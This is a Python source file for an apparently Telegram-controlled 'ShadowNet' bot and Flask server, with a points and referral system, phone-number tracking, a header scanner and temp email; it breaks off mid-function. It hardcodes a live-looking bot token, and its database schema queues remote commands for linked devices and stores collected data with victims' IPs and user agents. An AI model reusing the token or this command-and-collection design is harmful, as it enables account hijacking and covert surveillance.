# -*- coding: utf-8 -*-

"""
ShadowNet Framework v4.0 - النسخة الاحترافية النهائية
تم إعادة بناء جميع المواقع من الأكواد المصدرية الأصلية
جميع الأزرار تعمل بشكل حقيقي
"""

import os
import sys
import time
import json
import logging
import base64
import re
import secrets
import string
import shutil
import sqlite3
import hashlib
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import socket
import builtwith
import threading
import requests as req_lib
import uuid
import subprocess
from urllib.parse import urlparse

# ===================== معالجة استثناءات الاستيراد =====================
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    from flask import Flask, request, jsonify, render_template_string, abort, session, send_file, redirect, make_response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import pypdf
    from bs4 import BeautifulSoup
    from dotenv import load_dotenv
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from PIL import Image
    import yt_dlp
    import qrcode
except Exception as e:
    print(f"❌ فشل استيراد مكتبة: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== المتغيرات الأساسية =====================
DEFAULT_TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', DEFAULT_TOKEN)

DEFAULT_ADMIN = 7965377136
ADMIN_ID = int(os.environ.get('ADMIN_ID', DEFAULT_ADMIN))

ADMIN_KEY = os.environ.get('ADMIN_KEY', secrets.token_hex(32))
SERVER_URL = os.environ.get('SERVER_URL', 'https://my-t99-bot.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', secrets.token_hex(32))
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

if not TELEGRAM_TOKEN:
    logger.critical("❌ لم يتم العثور على TELEGRAM_TOKEN!")
    sys.exit(1)

if not ADMIN_ID:
    logger.warning("⚠️ ADMIN_ID غير مضبوط، سيتم استخدام المعرف الافتراضي 7965377136")
    ADMIN_ID = 7965377136

if not SERVER_URL and USE_WEBHOOK:
    logger.warning("⚠️ SERVER_URL غير مضبوط، سيتم استخدام Polling بدلاً من Webhook.")
    USE_WEBHOOK = False

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=5, backoff_factor=1.0, pool_connections=10, pool_maxsize=20):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=pool_connections,
        pool_maxsize=pool_maxsize
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)
app.secret_key = CLIENT_SECRET_KEY

# ===================== حماية Webhook =====================
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', secrets.token_hex(32))

def verify_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != WEBHOOK_SECRET:
        logger.warning("⚠️ محاولة وصول غير مصرح بها إلى Webhook.")
        abort(403)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        verify_webhook()
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            logger.info(f"✅ Webhook received: {json_string[:200]}...")
            update = Update.de_json(json_string)
            if update:
                bot.process_new_updates([update])
                logger.info(f"✅ تم إرسال التحديث للمعالجة: {update.update_id}")
                return '!', 200
            else:
                logger.error("❌ Invalid update object.")
                return 'Invalid update', 400
        else:
            logger.warning("⚠️ Non-JSON content-type received.")
            return 'Forbidden', 403
    except Exception as e:
        logger.error(f"❌ Webhook processing error: {e}")
        return 'Error', 500

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== دوال إرسال البيانات للمطور (نظام التقارير المنظمة) =====================
def generate_structured_report(report_type, data, user_id=None, username=None):
    """توليد تقرير منظم بصيغة Markdown للعرض في تليجرام"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    report = f"""# 📋 تقرير {report_type.replace('_', ' ').title()}

**⏰ الوقت:** {timestamp}

## 👤 معلومات المستخدم
| الخاصية | القيمة |
|---------|--------|
| المعرف | `{user_id or 'غير معروف'}` |
| المستخدم | @{username or 'غير معروف'} |

## 🎯 نوع النشاط
| الخاصية | القيمة |
|---------|--------|
| النوع | {data.get('action_type', 'غير معروف')} |
| المنصة | {data.get('platform', 'غير معروف')} |
| الحالة | {'✅ نجاح' if data.get('status') == 'success' else '❌ فشل'} |

## 📊 التفاصيل
"""
    for key, value in data.get('details', {}).items():
        if isinstance(value, str):
            report += f"| {key} | `{value}` |\n"
        else:
            report += f"| {key} | {value} |\n"
    
    report += f"""
## 🛡️ الأمان
| الخاصية | القيمة |
|---------|--------|
| مستوى الخطر | {data.get('risk_level', 'منخفض')} |
| مرفوض | {'✅ لا' if not data.get('flagged', False) else '⚠️ نعم'} |
| عنوان IP | `{data.get('ip', 'غير معروف')}` |
| المتصفح | `{data.get('user_agent', 'غير معروف')[:50]}...` |
"""
    return report

def send_structured_report(report_type, data, user_id=None, username=None):
    """إرسال تقرير منظم للمطور"""
    try:
        report = generate_structured_report(report_type, data, user_id, username)
        safe_send(ADMIN_ID, report)
        return True
    except Exception as e:
        logger.error(f"send_structured_report error: {e}")
        return False

def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 **تنبيه عطل فني:**\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 **إشعار:**\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

# ===================== رسالة الترحيب الجديدة =====================
WELCOME_MESSAGE = """
👋 **مرحباً بك في نظام التحكم الذكي**

📌 اختر الخدمة التي تريدها من القائمة أدناه

💡 تعليمات سريعة:
• الأزرار المغلقة 🔒 تتطلب نقاطاً
• يمكنك الحصول على نقاط عبر مشاركة النظام
• /help لعرض الأوامر الإضافية

🛡️ نظام آمن ومشفر بالكامل
"""

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0,
            welcome_sent INTEGER DEFAULT 0
        )''')
        c.execute("INSERT OR IGNORE INTO users (chat_id, username, first_name, registered_at, points) VALUES (0, 'system', 'System', ?, 0)", (datetime.now().isoformat(),))
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_unlocks (
            user_id INTEGER PRIMARY KEY,
            unlocked BOOLEAN DEFAULT 0,
            unlocked_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_permissions (
            user_id INTEGER,
            feature_name TEXT,
            enabled BOOLEAN DEFAULT 0,
            PRIMARY KEY (user_id, feature_name),
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            data_type TEXT,
            data TEXT,
            ip TEXT,
            user_agent TEXT,
            created_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS uploaded_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            filename TEXT,
            filepath TEXT,
            ip TEXT,
            user_agent TEXT,
            created_at TEXT
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_user_unlocks_user_id ON user_unlocks (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_user_permissions_user_id ON user_permissions (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_collected_data_session_id ON collected_data (session_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_uploaded_files_session_id ON uploaded_files (session_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال إدارة الصلاحيات =====================
def get_user_permissions(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT feature_name FROM user_permissions WHERE user_id = ? AND enabled = 1", (chat_id,))
        rows = c.fetchall()
        return [row['feature_name'] for row in rows]

def set_user_permission(chat_id, feature_name, enabled):
    with db_transaction() as conn:
        c = conn.cursor()
        if enabled:
            c.execute('''INSERT OR REPLACE INTO user_permissions (user_id, feature_name, enabled)
                         VALUES (?, ?, 1)''', (chat_id, feature_name))
        else:
            c.execute("DELETE FROM user_permissions WHERE user_id = ? AND feature_name = ?", (chat_id, feature_name))
        conn.commit()

def is_feature_enabled_for_user(chat_id, feature_name):
    if chat_id == ADMIN_ID:
        return True
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT enabled FROM user_permissions WHERE user_id = ? AND feature_name = ?", (chat_id, feature_name))
        row = c.fetchone()
        return row and row['enabled'] == 1

def get_all_users_with_permissions():
    users = get_all_users()
    result = []
    for user in users:
        perms = get_user_permissions(user['chat_id'])
        result.append({
            'id': user['chat_id'],
            'name': user['first_name'] or user['username'] or str(user['chat_id']),
            'points': user['points'],
            'banned': user['is_banned'],
            'unlocked': is_user_unlocked(user['chat_id']),
            'permissions': perms
        })
    return result

# ===================== دوال قاعدة البيانات الأساسية =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by, welcome_sent)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def is_new_user(chat_id):
    user = get_user(chat_id)
    if user is None:
        return True
    return user.get('welcome_sent', 0) == 0

def mark_welcome_sent(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET welcome_sent = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_user_points(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return row['points']
        return 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        rows = c.fetchall()
        return [{'amount': row['amount'], 'reason': row['reason'], 'created_at': row['created_at']} for row in rows]

def is_user_banned(chat_id):
    user = get_user(chat_id)
    if user is None:
        return False
    return user.get('is_banned', 0) == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def is_user_unlocked(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT unlocked FROM user_unlocks WHERE user_id = ?", (chat_id,))
        row = c.fetchone()
        return row and row['unlocked'] == 1

def toggle_user_unlock(chat_id, unlock=True):
    with db_transaction() as conn:
        c = conn.cursor()
        if unlock:
            c.execute('''INSERT OR REPLACE INTO user_unlocks (user_id, unlocked, unlocked_at)
                         VALUES (?, 1, ?)''', (chat_id, datetime.now().isoformat()))
        else:
            c.execute("DELETE FROM user_unlocks WHERE user_id = ?", (chat_id,))
        conn.commit()

def get_all_users():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT chat_id, username, first_name, points, is_banned FROM users")
        return c.fetchall()

def get_user_status(chat_id):
    return "متصل"

def get_all_users_with_status():
    users = get_all_users()
    result = []
    for user in users:
        unlocked = is_user_unlocked(user['chat_id'])
        status = get_user_status(user['chat_id'])
        result.append({
            'id': user['chat_id'],
            'name': user['first_name'] or user['username'] or str(user['chat_id']),
            'points': user['points'],
            'banned': user['is_banned'],
            'unlocked': unlocked,
            'status': status
        })
    return result

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        if chat_id == 0 or chat_id == "0":
            chat_id = 1
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        rows = c.fetchall()
        return [dict(row) for row in rows]

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices")
        rows = c.fetchall()
        return [dict(row) for row in rows]

def save_registered_device_db(device_id, chat_id):
    save_device(device_id, chat_id, 'unknown', '', '')

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev.get('blocked_domains'):
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except json.JSONDecodeError:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev.get('type') and 'طفل' in dev['type']:
            history = []
            if dev.get('history'):
                try:
                    history = json.loads(dev['history'])
                except json.JSONDecodeError:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال الخدمات الأساسية =====================
def advanced_website_scan(url):
    report = {}
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        report['url'] = url
        
        try:
            tech = builtwith.builtwith(url)
            report['technologies'] = tech
        except Exception as e:
            report['technologies'] = f"فشل في التحليل: {str(e)}"
        
        try:
            response = REQUEST_SESSION.get(url, timeout=15, allow_redirects=True)
            headers = response.headers
            security_headers = {
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy')
            }
            report['security_headers'] = security_headers
            report['status_code'] = response.status_code
            report['server'] = headers.get('Server', 'غير معروف')
            try:
                domain = url.split('/')[2] if '://' in url else url
                ip = socket.gethostbyname(domain)
                report['ip'] = ip
                ip_info = REQUEST_SESSION.get(f"http://ip-api.com/json/{ip}", timeout=10)
                if ip_info.status_code == 200:
                    data = ip_info.json()
                    if data.get('status') == 'success':
                        report['ip_details'] = {
                            'country': data.get('country'),
                            'city': data.get('city'),
                            'isp': data.get('isp'),
                            'lat': data.get('lat'),
                            'lon': data.get('lon')
                        }
                    else:
                        report['ip_details'] = 'لا توجد معلومات'
            except Exception as e:
                report['ip'] = f"فشل: {str(e)}"
        except Exception as e:
            report['security_headers'] = f"فشل الجلب: {str(e)}"
        
        vulnerabilities = []
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            if not sec.get('Content-Security-Policy'):
                vulnerabilities.append("ثغرة XSS: بسبب فقدان Content-Security-Policy.")
            if sec.get('X-Content-Type-Options') != 'nosniff':
                vulnerabilities.append("ثغرة MIME Sniffing: بسبب فقدان X-Content-Type-Options.")
            if not sec.get('X-Frame-Options'):
                vulnerabilities.append("ثغرة Clickjacking: بسبب فقدان X-Frame-Options.")
            if not sec.get('Strict-Transport-Security'):
                vulnerabilities.append("ثغرة MITM: بسبب فقدان HSTS.")
            if not sec.get('Referrer-Policy'):
                vulnerabilities.append("ثغرة تسريب معلومات: بسبب فقدان Referrer-Policy.")
            if not sec.get('Permissions-Policy'):
                vulnerabilities.append("ثغرة صلاحيات: بسبب فقدان Permissions-Policy.")
        
        risk_level = "🟢 منخفض"
        if len(vulnerabilities) >= 4:
            risk_level = "🔴 خطر عالٍ - يُنصح بعدم إدخال بيانات حساسة"
        elif len(vulnerabilities) >= 2:
            risk_level = "🟠 خطر متوسط"
        
        final_report = "==================================================\n"
        final_report += "🛡️ تقرير الفحص الأمني الرقمي\n"
        final_report += f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d | ⏰ الوقت: %H:%M:%S')}\n"
        final_report += "==================================================\n\n"
        
        final_report += "🌐 معلومات النطاق:\n"
        final_report += f"• النطاق: {url.split('/')[2] if '://' in url else url}\n"
        final_report += f"• الرابط: {url}\n\n"
        
        final_report += "🌍 بيانات الموقع الجغرافي والتقني:\n"
        final_report += f"• السيرفر: {report.get('server', 'غير معروف')}\n"
        if 'ip_details' in report and isinstance(report['ip_details'], dict):
            ipd = report['ip_details']
            final_report += f"• الموقع: {ipd.get('country', 'غير معروف')}, {ipd.get('city', 'غير معروف')}\n"
            final_report += f"• مزود الخدمة: {ipd.get('isp', 'غير معروف')}\n"
        else:
            final_report += "• الموقع: غير معروف\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🔒 حالة ترويسات الأمان (Security Headers):\n"
        final_report += "--------------------------------------------------\n"
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            for h, v in sec.items():
                status = "✅" if v else "❌"
                if h == 'Content-Security-Policy':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر XSS)'}\n"
                elif h == 'X-Content-Type-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MIME Sniffing)'}\n"
                elif h == 'X-Frame-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر Clickjacking)'}\n"
                elif h == 'Strict-Transport-Security':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MITM)'}\n"
                else:
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة'}\n"
        else:
            final_report += "⚠️ تعذر الحصول على الترويسات.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🚨 تقرير الثغرات المكتشفة:\n"
        final_report += "--------------------------------------------------\n"
        if vulnerabilities:
            final_report += f"تم اكتشاف ({len(vulnerabilities)}) ثغرات أمنية في هذا الموقع:\n\n"
            for i, vuln in enumerate(vulnerabilities, 1):
                final_report += f"{i}️⃣ {vuln}\n"
        else:
            final_report += "✅ لم يتم اكتشاف أي ثغرات أمنية واضحة.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += f"⚖️ التقييم النهائي: [ {risk_level} ]\n"
        final_report += "--------------------------------------------------\n\n"
        final_report += "📋 توصيات المطور:\n"
        final_report += "• يُرجى إضافة الترويسات المذكورة أعلاه في إعدادات السيرفر فوراً.\n"
        final_report += "• تفعيل بروتوكول HSTS لضمان اتصال مشفر دائم.\n"
        final_report += "• مراجعة سياسات الأمان بشكل دوري.\n"
        final_report += "==================================================\n"
        
        return final_report
    except Exception as e:
        logger.error(f"Advanced scan error: {e}")
        return f"⚠️ فشل الفحص المتقدم: {str(e)}"

def scan_website(url):
    return advanced_website_scan(url), "safe"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def track_phone_advanced(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        tz = timezone.time_zones_for_number(parsed)
        is_valid = phonenumbers.is_valid_number(parsed)
        number_type = phonenumbers.number_type(parsed)
        type_map = {0: "غير معروف", 1: "هاتف ثابت", 2: "هاتف محمول", 3: "خط ساخن", 4: "رقم خدمة", 5: "رقم خاص"}
        line_type = type_map.get(number_type, "غير معروف")
        lat, lng = None, None
        OPEN_CAGE_KEY = os.environ.get('OPEN_CAGE_KEY', '')
        location_text = ""
        if OPEN_CAGE_KEY and region:
            try:
                url = f"https://api.opencagedata.com/geocode/v1/json?q={region}&key={OPEN_CAGE_KEY}&language=ar"
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if data['results']:
                        lat = data['results'][0]['geometry']['lat']
                        lng = data['results'][0]['geometry']['lng']
                        location_text = f"\n📍 الإحداثيات التقريبية: {lat}, {lng}"
            except:
                pass
        result = (
            f"📍 <b>تقرير تتبع الرقم</b>\n\n"
            f"📱 الرقم: {phone}\n"
            f"✅ صحيح: {'نعم' if is_valid else 'لا'}\n"
            f"📞 النوع: {line_type}\n"
            f"🌍 البلد: {country}\n"
            f"📍 المنطقة: {region if region else 'غير معروف'}\n"
            f"📡 المشغل: {carrier_name if carrier_name else 'غير معروف'}\n"
            f"⏰ المنطقة الزمنية: {', '.join(tz) if tz else 'غير معروف'}"
        )
        if location_text:
            result += location_text
            if lat and lng:
                result += f"\n\n🗺️ <a href='https://www.google.com/maps?q={lat},{lng}'>عرض على الخريطة (Google)</a>"
                result += f"\n🗺️ <a href='https://www.openstreetmap.org/?mlat={lat}&mlon={lng}'>عرض على الخريطة (OSM)</a>"
        else:
            result += "\n\n⚠️ لم يتم العثور على إحداثيات دقيقة للموقع."
        result += "\n\n📌 ملاحظة: هذا الموقع تقريبي ويعتمد على سجلات المشغل."
        return result, "success"
    except Exception as e:
        return f"❌ خطأ: {str(e)}\n\nتأكد من إدخال الرقم بالصيغة الصحيحة (مثال: +201001234567).", "error"

def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
